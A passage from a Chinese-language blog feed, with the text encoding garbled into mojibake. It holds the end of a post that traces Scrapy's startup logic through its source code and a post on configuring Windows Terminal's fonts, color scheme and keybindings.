<h2 id="è°ƒè¯•é…ç½®"><a href="#è°ƒè¯•é…ç½®" class="headerlink" title="è°ƒè¯•é…ç½®"></a>è°ƒè¯•é…ç½®</h2><p>åœ¨é¡¹ç›®æ¨¡å—ä¸‹åˆ›å»º<code>run.py</code>æ–‡ä»¶, ä½¿ç”¨<code>Scrapy</code>æä¾›çš„å‘½ä»¤æ¥è¿è¡Œè°ƒè¯•.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.cmdline <span class="keyword">import</span> execute</span><br><span class="line"></span><br><span class="line">execute(<span class="string">&#x27;scrapy crawl quotes&#x27;</span>.split())</span><br></pre></td></tr></table></figure>

<p>æŠŠè°ƒè¯•ç¨‹åºè®¾ç½®ä¸º<code>run.py</code>çš„è·¯å¾„å¹¶è®¾ç½®å¯åŠ¨ç›®å½•, ä¹‹åç‚¹å‡»è°ƒè¯•å°±å¯ä»¥ç›´æ¥è¿è¡Œäº†.<br>å› ä¸º<code>vsCode</code>é»˜è®¤ä¼šè·³è¿‡ç¬¬ä¸‰æ–¹ä»£ç çš„è°ƒè¯•, è¿˜éœ€è¦åœ¨é…ç½®é‡Œæ·»åŠ <code>&quot;justMyCode&quot;: false</code>, æ‰èƒ½è°ƒè¯•éç”¨æˆ·ä»£ç .</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Start Scrapy&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;python&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;run.py&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;justMyCode&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/scrapy/tutorial&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;console&quot;</span><span class="punctuation">:</span> <span class="string">&quot;integratedTerminal&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="å¯åŠ¨é€»è¾‘"><a href="#å¯åŠ¨é€»è¾‘" class="headerlink" title="å¯åŠ¨é€»è¾‘"></a>å¯åŠ¨é€»è¾‘</h2><p>æŸ¥çœ‹<code>Scrapy</code>è·¯å¾„.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> scrapy</span><br><span class="line">/root/Application/miniconda3/envs/py-3.9/bin/scrapy</span><br></pre></td></tr></table></figure>

<p>å…ˆæ‰“å¼€<code>Scrapy</code>æ–‡ä»¶çœ‹çœ‹.<br>å¯ä»¥çœ‹åˆ°æœ€åæ˜¯æ‰§è¡Œäº†<code>execute()</code>æ–¹æ³•, è¿™ä¸ªæ–¹æ³•ä¸æ­£æ˜¯æˆ‘ä»¬ç”¨<code>Python</code>è¿è¡Œ<code>Scrapy</code>çš„æ¥è¿›è¡Œè°ƒè¯•çš„æ–¹æ³•å—?</p>
<p><img data-src="http://img.owq.world/2022/01/1644-5f57fa.png"></p>
<p>æ¥ä¸‹æ¥è®©æˆ‘ä»¬è¿›å…¥å†…éƒ¨çœ‹çœ‹å®ƒåšäº†äº›ä»€ä¹ˆ, è¿™é‡Œåªæ³¨é‡ä¸»é€»è¾‘, ä¸€äº›ç»†èŠ‚å¤„å°±ä¸å»åˆ¨æäº†.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">argv=<span class="literal">None</span>, settings=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> argv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        argv = sys.argv</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> settings <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        settings = get_project_settings()	<span class="comment"># è¿™é‡Œè¿›è¡Œäº†é…ç½®çš„åŠ è½½</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            editor = os.environ[<span class="string">&#x27;EDITOR&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            settings[<span class="string">&#x27;EDITOR&#x27;</span>] = editor</span><br><span class="line"></span><br><span class="line">    inproject = inside_project()</span><br><span class="line">    cmds = _get_commands_dict(settings, inproject)	<span class="comment"># åŠ è½½äº†Scrapyå‘½ä»¤æ¨¡å—</span></span><br><span class="line">    cmdname = _pop_command_name(argv)</span><br><span class="line">    parser = optparse.OptionParser(formatter=optparse.TitledHelpFormatter(),</span><br><span class="line">                                   conflict_handler=<span class="string">&#x27;resolve&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmdname:</span><br><span class="line">        _print_commands(settings, inproject)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmdname <span class="keyword">not</span> <span class="keyword">in</span> cmds:</span><br><span class="line">        _print_unknown_command(settings, cmdname, inproject)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    cmd = cmds[cmdname]	<span class="comment"># å‘½ä»¤è¡Œå‚æ•°è·å–æ˜ å°„</span></span><br><span class="line">    parser.usage = <span class="string">f&quot;scrapy <span class="subst">&#123;cmdname&#125;</span> <span class="subst">&#123;cmd.syntax()&#125;</span>&quot;</span></span><br><span class="line">    parser.description = cmd.long_desc()</span><br><span class="line">    settings.setdict(cmd.default_settings, priority=<span class="string">&#x27;command&#x27;</span>)</span><br><span class="line">    cmd.settings = settings</span><br><span class="line">    cmd.add_options(parser)</span><br><span class="line">    opts, args = parser.parse_args(args=argv[<span class="number">1</span>:])</span><br><span class="line">    _run_print_help(parser, cmd.process_options, args, opts)</span><br><span class="line"></span><br><span class="line">    cmd.crawler_process = CrawlerProcess(settings)	<span class="comment"># åŠ¨æ€åŠ è½½çˆ¬è™«æ¨¡å—</span></span><br><span class="line">    _run_print_help(parser, _run_command, cmd, args, opts)	<span class="comment"># å®ä¾‹åŒ–çˆ¬è™«ç±»å’Œå¯åŠ¨å¼•æ“</span></span><br><span class="line">    sys.exit(cmd.exitcode)</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹çœ‹<code>get_project_settings()</code></p>
<p><img data-src="http://img.owq.world/2022/01/1453-5f4a43.png"></p>
<p>é‡Œé¢é‡è¦çš„åœ°æ–¹æ˜¯åˆå§‹åŒ–<code>Settings</code>ç±»çš„è¿‡ç¨‹</p>
<p><img data-src="http://img.owq.world/2022/01/1447-ded0a5.png"></p>
<p><code>Settings</code>ç±»è¿›è¡Œäº†æ¨¡å—çš„åŠ¨æ€åŠ è½½, <code>self.setmodule</code>æœ€ç»ˆä¼šè°ƒç”¨<code>import_module()</code>æ–¹æ³•</p>
<p><img data-src="http://img.owq.world/2022/01/1708-80010a.png"></p>
<p>é€šè¿‡è°ƒè¯•çœ‹çœ‹<code>settings</code>ä¸‹,æœ€ååŠ è½½äº†<code>attributes</code>é‡Œä¸€å¤§å †é…ç½®.</p>
<p><img data-src="http://img.owq.world/2022/01/1445-54618b.png"></p>
<p>æ¥ä¸‹æ¥çœ‹çœ‹<code>_get_commands_dict()</code></p>
<p><img data-src="http://img.owq.world/2022/01/1455-224efe.png"></p>
<p>è¿™é‡Œä¸»è¦åŠ è½½äº†<code>scrapy.commands</code>ä¸‹æ‰€æœ‰æ¨¡å—</p>
<p><img data-src="http://img.owq.world/2022/01/1501-4e87e3.png"></p>
<p><img data-src="http://img.owq.world/2022/01/1515-04bf67.png"></p>
<p>æœ€åè¿”å›æ¨¡å—åå’Œå…¶æ˜ å°„ï¼Œä»”ç»†çœ‹çœ‹è¿™ä¸å°±æ˜¯è¿è¡Œ<code>Scrapy</code>çš„å‘½ä»¤å—</p>
<p><img data-src="http://img.owq.world/2022/01/1514-577b65.png"></p>
<p>ç»§ç»­å¾€ä¸‹çœ‹ï¼ŒåŠ è½½<code>Scrapy</code>è‡ªå¸¦çš„è§£æå™¨åï¼Œå¼€å§‹å‡†å¤‡å‘½ä»¤çš„æ‰§è¡Œå·¥ä½œäº†ã€‚</p>
<p><img data-src="http://img.owq.world/2022/01/1532-684509.png"></p>
<p>å‡†å¤‡å·¥ä½œåšå®Œäº†ï¼Œå¼€å§‹åˆå§‹åŒ–<code>CrawlerProcess()</code></p>
<p><img data-src="http://img.owq.world/2022/01/1537-269ec9.png"></p>
<p>çœ‹çœ‹ç»§æ‰¿çš„ç±»<code>CrawlerRunner</code>ï¼Œ è¿™ä¸ªæ‰æ˜¯é‡ç‚¹</p>
<p><img data-src="http://img.owq.world/2022/01/1542-f41c3c.png"></p>
<p><code>CrawlerRunner</code>çš„<code>__init__</code>è°ƒç”¨äº†<code>_get_spider_loader(settings)</code>,å®ƒè°ƒç”¨äº†<code>load_object()</code>æ–¹æ³•</p>
<p><img data-src="http://img.owq.world/2022/01/1550-d35b02.png"></p>
<p><code>load_object()</code>ä½¿ç”¨<code>import_module()</code>åŠ¨æ€åŠ è½½äº†<code>scrapy.spiderloader</code>æ¨¡å—</p>
<p><img data-src="http://img.owq.world/2022/01/1555-c331b2.png"></p>
<p><code>SpiderLoader</code>åŠ è½½æ—¶è°ƒç”¨äº†<code>_load_all_spiders()</code>æ–¹æ³•</p>
<p><img data-src="http://img.owq.world/2022/01/1558-e763f6.png"></p>
<p>å®ƒé€šè¿‡<code>walk_modules</code>æ–¹æ³•åŠ è½½äº†spidersç›®å½•ä¸‹æ‰€æœ‰çš„çˆ¬è™«</p>
<p><img data-src="http://img.owq.world/2022/01/1601-2b4ada.png" alt="image-20220105160151008"></p>
<p>æ¥ä¸‹æ¥çœ‹çœ‹<code>_run_command</code>æ–¹æ³•ã€‚</p>
<p><img data-src="http://img.owq.world/2022/01/1608-f3621c.png"></p>
<p>å®ƒæœ€åéƒ½ä¼šæ‰§è¡Œ<code>scrapy.commands.crawl</code>é‡Œçš„<code>run</code>æ–¹æ³•ï¼Œå¯åŠ¨çˆ¬è™«å¼•æ“ï¼Œè¿™ä¹Ÿæ˜¯æå…¶é‡è¦çš„ä¸€æ­¥.<br>å…¶ä¸­<code>crawl</code>æ–¹æ³•ä¼šå®ä¾‹åŒ–<code>scrapy.crawler.Crawler</code>ç±», ä¹‹åé€šè¿‡<code>start()</code>æ¥å¯åŠ¨çˆ¬è™«å¼•æ“.</p>
<p><img data-src="http://img.owq.world/2022/01/1638-ca1010.png" alt="image-20220105163802583"></p>
<p>è‡³æ­¤, å¤§è‡´çš„æ‰§è¡Œé€»è¾‘å°±æ‹æ¸…äº†<code>ãƒ¾(â€¢Ï‰â€¢</code>)o&#96;</p>
<h2 id="å…³é”®å‡½æ•°"><a href="#å…³é”®å‡½æ•°" class="headerlink" title="å…³é”®å‡½æ•°"></a>å…³é”®å‡½æ•°</h2><h3 id="import-module"><a href="#import-module" class="headerlink" title="import_module()"></a>import_module()</h3><blockquote>
<p>è¿™æ˜¯<code>Python</code>è‡ªå¸¦<code>importlib</code>åº“çš„æ–¹æ³•, ä¹Ÿæ˜¯è¿›è¡ŒåŠ¨æ€åŠ è½½æ¨¡å—çš„å…³é”®, <code>Scrapy</code>çš„å¾ˆå¤šæ–¹æ³•éƒ½ä½¿ç”¨åˆ°å®ƒ.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">import_module</span>(<span class="params">name, package=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Import a module.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The &#x27;package&#x27; argument is required when performing a relative import. It</span></span><br><span class="line"><span class="string">    specifies the package to use as the anchor point from which to resolve the</span></span><br><span class="line"><span class="string">    relative import to an absolute import.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    level = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> name.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> package:</span><br><span class="line">            msg = (<span class="string">&quot;the &#x27;package&#x27; argument is required to perform a relative &quot;</span></span><br><span class="line">                   <span class="string">&quot;import for &#123;!r&#125;&quot;</span>)</span><br><span class="line">            <span class="keyword">raise</span> TypeError(msg.<span class="built_in">format</span>(name))</span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">if</span> character != <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            level += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> _bootstrap._gcd_import(name[level:], package, level)</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>æŠ€æœ¯è®°å½•</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Terminal å¿«é€Ÿé…ç½®</title>
    <url>/terminal/</url>
    <content><![CDATA[<h1 id="Windows-Terminal-å¿«é€Ÿé…ç½®"><a href="#Windows-Terminal-å¿«é€Ÿé…ç½®" class="headerlink" title="Windows Terminal å¿«é€Ÿé…ç½®"></a>Windows Terminal å¿«é€Ÿé…ç½®</h1><blockquote>
<p>å®˜æ–¹æ–‡æ¡£: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy90ZXJtaW5hbC8=">https://docs.microsoft.com/zh-cn/windows/terminal/</span></p>
</blockquote>
<h2 id="ä¸‹è½½å®‰è£…"><a href="#ä¸‹è½½å®‰è£…" class="headerlink" title="ä¸‹è½½å®‰è£…"></a>ä¸‹è½½å®‰è£…</h2><blockquote>
<p>é¡¹ç›®åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC90ZXJtaW5hbA==">ğŸšª</span><br>ä¸‹è½½åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC90ZXJtaW5hbC9yZWxlYXNlcy9sYXRlc3Q=">ğŸšª</span></p>
</blockquote>
<p>æˆ–è€…ä½¿ç”¨<code>winget</code>å®‰è£…</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">winget install <span class="literal">--id</span>=Microsoft.WindowsTerminal <span class="literal">-e</span></span><br></pre></td></tr></table></figure>

<h2 id="å¤–è§‚é…ç½®"><a href="#å¤–è§‚é…ç½®" class="headerlink" title="å¤–è§‚é…ç½®"></a>å¤–è§‚é…ç½®</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;theme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dark&quot;</span><span class="punctuation">,</span>	<span class="comment">// ä¸»é¢˜é¢œè‰²</span></span><br><span class="line"><span class="attr">&quot;initialCols&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span>	<span class="comment">// çª—å£åˆ—æ•°</span></span><br><span class="line"><span class="attr">&quot;initialRows&quot;</span><span class="punctuation">:</span> <span class="number">28</span><span class="punctuation">,</span>	<span class="comment">// çª—å£è¡Œæ•°</span></span><br><span class="line"><span class="attr">&quot;profiles&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;defaults&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;closeOnExit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;graceful&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;colorScheme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span>	<span class="comment">// é…è‰²æ–¹æ¡ˆ</span></span><br><span class="line">        <span class="attr">&quot;font&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;face&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Fira Code&quot;</span><span class="punctuation">,</span>	<span class="comment">// ä½¿ç”¨å­—ä½“</span></span><br><span class="line">            <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">10</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;useAcrylic&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span>		<span class="comment">// äºšå…‹åŠ›èƒŒæ™¯</span></span><br><span class="line">        <span class="attr">&quot;acrylicOpacity&quot;</span><span class="punctuation">:</span> <span class="number">0.75</span><span class="punctuation">,</span>		<span class="comment">// é€æ˜åº¦</span></span><br><span class="line">        <span class="attr">&quot;padding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10, 8, 0, 2&quot;</span>	<span class="comment">// çª—å£å†…è¾¹æ¡†</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Fira-Code-å­—ä½“"><a href="#Fira-Code-å­—ä½“" class="headerlink" title="Fira Code å­—ä½“"></a>Fira Code å­—ä½“</h3><blockquote>
<p>é¡¹ç›®åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvbnNreS9GaXJhQ29kZQ==">ğŸšª</span><br>ä¸‹è½½åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvbnNreS9GaXJhQ29kZS9yZWxlYXNlcy9kb3dubG9hZC82L0ZpcmFfQ29kZV92Ni56aXA=">ğŸšª</span></p>
</blockquote>
<p>å¸¦å›¾æ ‡å­—ä½“ï¼ˆæ¨èï¼‰</p>
<blockquote>
<p>é¡¹ç›®åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J5YW5vYXNpcy9uZXJkLWZvbnRz">ğŸšª</span><br>ä¸‹è½½åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J5YW5vYXNpcy9uZXJkLWZvbnRzL3JlbGVhc2VzL2Rvd25sb2FkL3YyLjEuMC9GaXJhQ29kZS56aXA=">ğŸšª</span></p>
</blockquote>
<p>å°†å®‰è£…åŒ…å†…çš„ <code>FiraCode</code> ç³»åˆ—å­—ä½“è§£å‹å®‰è£…</p>
<img data-src="http://img.owq.world/2021/12/1637-38fb5b.png" style="zoom: 80%;" />

<p>ç»ˆç«¯å­—ä½“é…ç½®ä½¿ç”¨<code>FiraCode Nerd Font</code>å³å¯ç”Ÿæ•ˆ</p>
<img data-src="http://img.owq.world/2021/12/1641-8e55ff.png" style="zoom:67%;" />

<h3 id="æœå†»é¢œè‰²æ–¹æ¡ˆ"><a href="#æœå†»é¢œè‰²æ–¹æ¡ˆ" class="headerlink" title="æœå†»é¢œè‰²æ–¹æ¡ˆ"></a>æœå†»é¢œè‰²æ–¹æ¡ˆ</h3><blockquote>
<p>ä¸ªäººä¸“å±æœå†»é…è‰²ï¼ˆï¿£ã€‚ã€‚ï¿£ï¼‰</p>
</blockquote>
<p><code>schemes</code> æ ‡ç­¾é‡Œæ·»åŠ </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#2C2C2C&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;black&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#4A4A4A&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;blue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#69B4D9&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightBlack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#A8A8A8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightBlue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#669AEB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightCyan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#32EBDA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightGreen&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#31D328&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightPurple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#A972AD&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightRed&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FD5469&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightWhite&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#E6E6E6&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightYellow&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#F1E452&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cursorColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFFF&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cyan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#80F3DA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FCFCFC&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;green&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#91D97A&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;purple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#AD7FA8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;red&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#E06C75&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;selectionBackground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFFF&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;white&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFE4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;yellow&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EEE691&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="æœ€ç»ˆæ•ˆæœå›¾"><a href="#æœ€ç»ˆæ•ˆæœå›¾" class="headerlink" title="æœ€ç»ˆæ•ˆæœå›¾"></a>æœ€ç»ˆæ•ˆæœå›¾</h3><p><img data-src="http://img.owq.world/2021/12/1716-d121ee.png"></p>
<h2 id="å¿«æ·é”®é…ç½®"><a href="#å¿«æ·é”®é…ç½®" class="headerlink" title="å¿«æ·é”®é…ç½®"></a>å¿«æ·é”®é…ç½®</h2><p>å°†å¸¸ç”¨å¿«æ·æ“ä½œå’Œç³»ç»Ÿå¿«æ·é”®ç»Ÿä¸€</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;actions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;toggleFullscreen&quot;</span><span class="punctuation">,</span>  <span class="comment">// å…¨å±åˆ‡æ¢</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+m&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;find&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+f&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;closePane&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+w&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;copy&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;singleLine&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+c&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;paste&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+v&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;splitPane&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;split&quot;</span><span class="punctuation">:</span> <span class="string">&quot;auto&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;splitMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;duplicate&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+d&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+1&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+2&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+3&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    	<span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span 